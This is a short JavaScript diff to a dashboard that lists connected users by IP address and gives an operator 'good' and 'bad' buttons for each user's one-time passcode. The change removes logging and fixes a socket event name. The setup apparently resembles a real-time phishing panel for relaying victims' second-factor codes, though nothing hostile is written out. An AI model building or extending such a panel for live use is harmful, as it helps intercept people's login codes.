@@ -129,12 +129,10 @@ function updateConnectionsTable(users) {
           let sendOtpBadButton = userDiv.querySelector('.send-otp-bad-button');
           sendOtpGoodButton.addEventListener('click', function() {
             socket.emit('sendOTPResponse', {ip: ipAddress, res: `good` })
-            console.log('emit otp send')
           });
 
           sendOtpBadButton.addEventListener('click', function() {
-            socket.emit('sendOTP', {ip: ipAddress, res: `bad` })
-            console.log('emit otp send')
+            socket.emit('sendOTPResponse', {ip: ipAddress, res: `bad` })
           });          
 
     } else {
